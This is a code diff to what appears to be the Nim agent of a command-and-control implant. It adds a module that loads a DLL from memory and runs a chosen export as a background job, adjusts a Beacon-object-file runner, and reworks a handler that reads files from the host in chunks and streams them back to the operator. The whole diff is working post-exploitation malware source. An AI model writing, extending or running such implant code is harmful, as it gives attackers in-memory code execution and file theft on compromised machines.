@@ -190,7 +190,6 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
             let 
                 objectFile: seq[byte] = task.args[0].data
                 arguments: seq[byte] = Bytes.fromHex(task.args[1].data)
-                async: bool = cast[bool](task.args[2].data[0])
 
             # Unpacking object file, since it contains the file name too.
             var unpacker = Unpacker.init(Bytes.toString(objectFile))
@@ -251,12 +250,36 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
+when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
+    import ../utils/[rdll, beacon]
+
+    commands[CMD_DLL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
+
+        proc dllProc(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
+            var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
+            let
+                dllName:    string    = unpacker.getDataWithLengthPrefix()
+                dllBytes:   seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
+                exportName: string    = Bytes.toString(task.args[1].data)
+                args:       seq[byte] = Bytes.fromHex(task.args[2].data)
+            
+            execDll(dllBytes, exportName, args, hWrite, ctx.hWakeupEvent, hStopEvent)
+            
+        try: 
+            if not ctx.startJob(task, dllProc):
+                raise newException(CatchableError, GetLastError().getError())
+            
+            return ctx.createTaskResult(task, STATUS_STARTED, RESULT_NO_OUTPUT, @[])
+
+        except CatchableError as err:
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
 when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
     import os
 
     const DOWNLOAD_CHUNK_SIZE* = 512 * 1024
 
-    proc downloadProc(hWrite: HANDLE, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
+    proc downloadProc(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
         let filePath = absolutePath(Bytes.toString(task.args[0].data))
         
         let hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
@@ -267,13 +290,11 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
         var buffer: array[DOWNLOAD_CHUNK_SIZE, byte]
         while WaitForSingleObject(hStopEvent, 0) == WAIT_TIMEOUT:
             var dwBytesRead: DWORD
-            if ReadFile(hFile, addr buffer[0], DOWNLOAD_CHUNK_SIZE, 
-                addr dwBytesRead, nil) == FALSE or dwBytesRead == 0:
+            if ReadFile(hFile, addr buffer[0], DOWNLOAD_CHUNK_SIZE, addr dwBytesRead, nil) == FALSE or dwBytesRead == 0:
                 break
             
             var dwBytesWritten: DWORD
-            if WriteFile(hWrite, addr buffer[0], dwBytesRead, 
-                addr dwBytesWritten, nil) == FALSE:
+            if WriteFile(hWrite, addr buffer[0], dwBytesRead, addr dwBytesWritten, nil) == FALSE:
                 break
 
     commands[CMD_DOWNLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
